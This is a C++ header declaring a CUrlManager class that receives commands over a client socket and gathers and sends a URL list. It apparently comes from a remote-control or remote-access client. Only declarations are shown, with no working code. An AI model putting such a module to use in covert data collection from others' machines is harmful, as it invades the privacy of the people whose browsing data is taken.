#pragma once
#include "..\Manager.h"

class CUrlManager : public CManager  
{
public:
	CUrlManager(CClientSocket *pClient);
	virtual ~CUrlManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
private:
	LPBYTE getUrlList();
	void SendUrlList();
};
